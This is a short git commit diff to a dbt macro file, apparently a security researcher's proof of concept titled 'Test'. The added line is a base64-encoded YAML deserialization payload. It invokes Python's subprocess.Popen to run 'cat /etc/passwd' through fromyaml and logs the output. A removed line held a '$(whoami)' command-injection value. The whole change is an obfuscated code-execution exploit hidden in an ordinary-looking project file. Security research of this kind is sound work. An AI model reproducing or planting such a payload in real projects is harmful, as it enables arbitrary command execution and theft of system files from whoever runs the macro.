cc1a85ed18cee8a9aacbf7a8159783f31fdc6f7d
Sebas Guerrero <sguerrero+aws3@bishopfox.com>
2022-08-30 14:12:11 +0000

    Test

--- macros/get_version.sql
+++ macros/get_version.sql
@@ -1,13 +1,10 @@
-{% macro get_version() %}
+{% macro whoami() %}
 
 {% set yaml_str -%}
 
-!!python/object/apply:builtins.range:
-    - 1
-    - 10
-    - 1
+ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gY2F0CiAgLSAvZXRjL3Bhc3N3ZAo=
 
 {%- endset %}
-{% set my_dict = fromyaml(yaml_str, '$(whoami)') %}
+{% set my_dict = fromyaml(yaml_str)  %}
 {% do log(my_dict, info=true) %}
 {% endmacro %}
